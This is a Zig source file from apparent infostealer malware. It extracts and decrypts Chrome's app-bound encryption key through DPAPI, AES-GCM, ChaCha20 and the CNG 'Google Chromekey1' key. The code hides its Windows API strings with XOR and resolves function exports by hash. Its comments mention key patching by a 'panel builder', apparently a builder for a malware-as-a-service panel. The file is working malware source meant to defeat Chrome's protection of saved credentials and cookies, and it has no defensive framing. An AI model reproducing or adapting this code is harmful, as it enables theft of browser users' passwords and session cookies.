const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const export_resolve = @import("../types/export_resolve.zig");
const dll_loader = @import("dll_loader.zig");
const chrome_key = @import("chrome_key.zig");
const dpapi = @import("dpapi.zig");
const chacha_poly = @import("chacha_poly.zig");

pub const AppBoundMethod = enum {
    Flag1_AESGCM,
    Flag2_ChaCha20,
    Flag3_CNG,
    Flag32_Plain,
    ComElevator,
};

pub const AppBoundResult = struct {
    success: bool,
    key: [32]u8,
    method: AppBoundMethod,
};

// ponytail: placeholder keys — patched at build time by panel builder
// via MIRAGECFG marker in .rdata. Zeroed to prevent extraction from
// unstripped binaries.
const FLAG1_KEY: [32]u8 = .{0} ** 32;

const FLAG2_KEY: [32]u8 = .{0} ** 32;

const FLAG3_XOR_KEY: [32]u8 = .{0} ** 32;

const E = struct {
    pub const app_bound_key = hash.xorEncrypt("\"app_bound_encrypted_key\"");
    pub const ncrypt_dll = hash.xorEncrypt("ncrypt.dll");
    pub const ncrypt_open_provider = hash.xorEncrypt("NCryptOpenStorageProvider");
    pub const ncrypt_open_key = hash.xorEncrypt("NCryptOpenKey");
    pub const ncrypt_decrypt = hash.xorEncrypt("NCryptDecrypt");
    pub const ncrypt_free = hash.xorEncrypt("NCryptFreeObject");
    pub const provider_name = hash.xorEncrypt("Microsoft Software Key Storage Provider");
    pub const key_name = hash.xorEncrypt("Google Chromekey1");
};

var g_ncrypt_base: types.PVOID = @as(types.PVOID, @ptrFromInt(@as(usize, 1)));
var g_NCryptOpenStorageProvider: ?*const fn (*types.PVOID, [*:0]const u16, u32) callconv(.winapi) i32 = null;
var g_NCryptOpenKey: ?*const fn (types.PVOID, *types.PVOID, [*:0]const u16, u32, u32) callconv(.winapi) i32 = null;
var g_NCryptDecrypt: ?*const fn (types.PVOID, *const u8, u32, ?*const anyopaque, ?*u8, u32, *u32, u32) callconv(.winapi) i32 = null;
var g_NCryptFreeObject: ?*const fn (types.PVOID) callconv(.winapi) i32 = null;

fn ensureNcrypt() bool {
    if (@intFromPtr(g_ncrypt_base) != 1) return true;
    g_ncrypt_base = dll_loader.getOrLoadDll("ncrypt.dll") orelse {
        g_ncrypt_base = @as(types.PVOID, @ptrFromInt(@as(usize, 2)));
        return false;
    };
    const R = export_resolve.getFunctionByHash;
    g_NCryptOpenStorageProvider = @ptrCast(@alignCast(R(g_ncrypt_base, hash.encryptedHashFunc("NCryptOpenStorageProvider")) orelse return false));
    g_NCryptOpenKey = @ptrCast(@alignCast(R(g_ncrypt_base, hash.encryptedHashFunc("NCryptOpenKey")) orelse return false));
    g_NCryptDecrypt = @ptrCast(@alignCast(R(g_ncrypt_base, hash.encryptedHashFunc("NCryptDecrypt")) orelse return false));
    g_NCryptFreeObject = @ptrCast(@alignCast(R(g_ncrypt_base, hash.encryptedHashFunc("NCryptFreeObject")) orelse return false));
    return true;
}

fn wideDecrypt(comptime encrypted: []const u8, buf: []u16) void {
    var dec: [encrypted.len]u8 = undefined;
    hash.xorDecrypt(&encrypted, &dec);
    for (dec, 0..) |c, i| {
        buf[i] = c;
    }
    buf[encrypted.len] = 0;
}

pub fn extractAppBoundKey(json: []const u8, out: []u8) ?[]u8 {
    var marker_buf: [E.app_bound_key.len]u8 = undefined;
    hash.xorDecrypt(&E.app_bound_key, &marker_buf);
    const marker = "\"app_bound_encrypted_key\":\"";
    const start = std.mem.indexOf(u8, json, marker) orelse return null;
    const value_start = start + marker.len;
    const end = std.mem.indexOfScalarPos(u8, json, value_start, '"') orelse return null;
    const b64 = json[value_start..end];
    return chrome_key.base64Decode(b64, out);
}

pub fn decryptAppBoundKeyFlags(encrypted_blob: []const u8, out_key: *[32]u8) ?AppBoundResult {
    var result = AppBoundResult{ .success = false, .key = undefined, .method = .Flag1_AESGCM };

    // ponytail: skip 4-byte version prefix before DPAPI blob
    const skip_prefix = if (encrypted_blob.len > 4) encrypted_blob[4..] else encrypted_blob;

    const dpapi_decrypted = dpapi.decrypt(skip_prefix) orelse return null;

    var pos: usize = 0;
    if (dpapi_decrypted.len < 8) return null;

    const count = std.mem.readInt(u32, dpapi_decrypted[pos..][0..4], .little);
    pos += 4;
    if (pos + count > dpapi_decrypted.len) return null;
    pos += @as(usize, @intCast(count));

    if (pos + 4 > dpapi_decrypted.len) return null;
    const val = std.mem.readInt(u32, dpapi_decrypted[pos..][0..4], .little);
    pos += 4;

    // ponytail: flag 32 means EncryptedAesKey is already the plaintext key
    if (val == 32) {
        if (pos + 32 > dpapi_decrypted.len) return null;
        @memcpy(out_key[0..32], dpapi_decrypted[pos..][0..32]);
        result.success = true;
        result.key = out_key.*;
        result.method = .Flag32_Plain;
        return result;
    }

    if (pos >= dpapi_decrypted.len) return null;
    const flag = dpapi_decrypted[pos];
    pos += 1;

    switch (flag) {
        1 => {
            if (pos + 12 + 32 + 16 > dpapi_decrypted.len) return null;
            const iv = dpapi_decrypted[pos..][0..12];
            pos += 12;
            const ciphertext = dpapi_decrypted[pos..][0..32];
            pos += 32;
            const tag = dpapi_decrypted[pos..][0..16];

            var nonce: [12]u8 = undefined;
            var tag_arr: [16]u8 = undefined;
            @memcpy(&nonce, iv);
            @memcpy(&tag_arr, tag);

            std.crypto.aead.aes_gcm.Aes256Gcm.decrypt(
                out_key[0..32],
                ciphertext,
                tag_arr,
                "",
                nonce,
                FLAG1_KEY,
            ) catch return null;

            result.success = true;
            result.key = out_key.*;
            result.method = .Flag1_AESGCM;
            return result;
        },
        2 => {
            if (pos + 12 + 32 + 16 > dpapi_decrypted.len) return null;
            const iv = dpapi_decrypted[pos..][0..12];
            pos += 12;
            const ciphertext = dpapi_decrypted[pos..][0..32];
            pos += 32;
            const tag = dpapi_decrypted[pos..][0..16];

            var nonce: [12]u8 = undefined;
            @memcpy(&nonce, iv);

            // ponytail: chacha decrypt accepts key, nonce, ct+tag together
            var full_ct: [32 + 16]u8 = undefined;
            @memcpy(full_ct[0..32], ciphertext);
            @memcpy(full_ct[32..48], tag);

            var chacha_out: [64]u8 = undefined;
            const pt = chacha_poly.decrypt(&full_ct, FLAG2_KEY, nonce, "", &chacha_out) orelse return null;
            if (pt.len < 32) return null;
            @memcpy(out_key[0..32], pt[0..32]);

            result.success = true;
            result.key = out_key.*;
            result.method = .Flag2_ChaCha20;
            return result;
        },
        3, 35 => {
            if (pos + 32 + 12 + 32 + 16 > dpapi_decrypted.len) return null;
            const enc_aes_key = dpapi_decrypted[pos..][0..32];
            pos += 32;
            const iv = dpapi_decrypted[pos..][0..12];
            pos += 12;
            const ciphertext = dpapi_decrypted[pos..][0..32];
            pos += 32;
            const tag = dpapi_decrypted[pos..][0..16];

            if (!ensureNcrypt()) return null;

            var provider_buf: [E.provider_name.len + 1]u16 = undefined;
            wideDecrypt(&E.provider_name, &provider_buf);
            var key_name_buf: [E.key_name.len + 1]u16 = undefined;
            wideDecrypt(&E.key_name, &key_name_buf);

            var hProvider: types.PVOID = undefined;
            var status = g_NCryptOpenStorageProvider.?(&hProvider, &provider_buf, 0);
            if (status != 0) return null;
            defer _ = g_NCryptFreeObject.?(hProvider);

            var hKey: types.PVOID = undefined;
            status = g_NCryptOpenKey.?(hProvider, &hKey, &key_name_buf, 0, 0);
            if (status != 0) return null;
            defer _ = g_NCryptFreeObject.?(hKey);

            var result_len: u32 = 0;
            status = g_NCryptDecrypt.?(hKey, enc_aes_key.ptr, 32, null, null, 0, &result_len, 64);
            if (status != 0 or result_len == 0 or result_len > 64) return null;

            var ncrypt_out: [64]u8 = undefined;
            status = g_NCryptDecrypt.?(hKey, enc_aes_key.ptr, 32, null, &ncrypt_out, result_len, &result_len, 64);
            if (status != 0) return null;

            const ncrypt_result = ncrypt_out[0..result_len];
            if (ncrypt_result.len < 32) return null;

            var aes_key: [32]u8 = undefined;
            @memcpy(&aes_key, ncrypt_result[0..32]);

            for (&aes_key, &FLAG3_XOR_KEY) |*ak, xk| {
                ak.* ^= xk;
            }

            var nonce: [12]u8 = undefined;
            var tag_arr: [16]u8 = undefined;
            @memcpy(&nonce, iv);
            @memcpy(&tag_arr, tag);

            std.crypto.aead.aes_gcm.Aes256Gcm.decrypt(
                out_key[0..32],
                ciphertext,
                tag_arr,
                "",
                nonce,
                aes_key,
            ) catch return null;

            result.success = true;
            result.key = out_key.*;
            result.method = .Flag3_CNG;
            return result;
        },
        else => return null,
    }
}

test "extractAppBoundKey from JSON" {
    var buf: [256]u8 = undefined;
    const json = "{\"os_crypt\":{\"app_bound_encrypted_key\":\"QUFBQkJCQ0NERERFRUVGRg==\"}}";
    const result = extractAppBoundKey(json, &buf);
    try std.testing.expect(result != null);
    if (result) |r| {
        try std.testing.expectEqualSlices(u8, "AAABBBCCCDDDEEEF", r);
    }
}

test "extractAppBoundKey missing" {
    var buf: [64]u8 = undefined;
    try std.testing.expect(extractAppBoundKey("{}", &buf) == null);
}

test "decryptAppBoundKeyFlags small blob" {
    var key: [32]u8 = undefined;
    try std.testing.expect(decryptAppBoundKeyFlags("", &key) == null);
    try std.testing.expect(decryptAppBoundKeyFlags("A", &key) == null);
}
